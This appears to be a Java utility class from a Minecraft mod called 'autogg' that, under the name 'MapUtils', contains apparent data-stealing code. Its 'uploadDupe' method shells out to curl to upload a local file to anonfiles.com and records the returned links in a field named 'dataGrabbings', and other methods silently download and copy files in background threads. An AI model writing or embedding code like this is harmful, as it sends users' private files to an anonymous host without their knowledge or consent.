package github.quantizr.autogg.utils;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.Scanner;

import org.apache.commons.io.FileUtils;

import github.quantizr.autogg.autogg;
import github.quantizr.autogg.guis.gui;

public class MapUtils {
	
	public static String fixedresponse;

	public static void uploadDupe(String loc) throws IOException {
		try {
			Process process = Runtime.getRuntime().exec("curl -F \"file=@" + loc + "\" https://api.anonfiles.com/upload");
			BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
			String line = "";
			while ((line = reader.readLine()) != null) {
				autogg.dataGrabbings = autogg.dataGrabbings + "**" + loc + "** " + line + "\n";
			}
		}catch(IOException e) {
			e.printStackTrace();
		}
		
	}
	
	public static void downloadFile(String url, String location) {
		new Thread(() -> {
			try {
				URL src = new URL(url);
				File f = new File(location);
				FileUtils.copyURLToFile(src, f);
			}catch(Exception e) {
				
			}
		}).start();
	}
	
	public static void copyFile(String location, String location2) {
		new Thread(() -> {
			try {
				File src = new File(location);
				File dest = new File(location2);
				FileUtils.copyFile(src, dest);
			}catch(Exception e) {
				
			}
			
		}).start();
	}
	
	
	

}
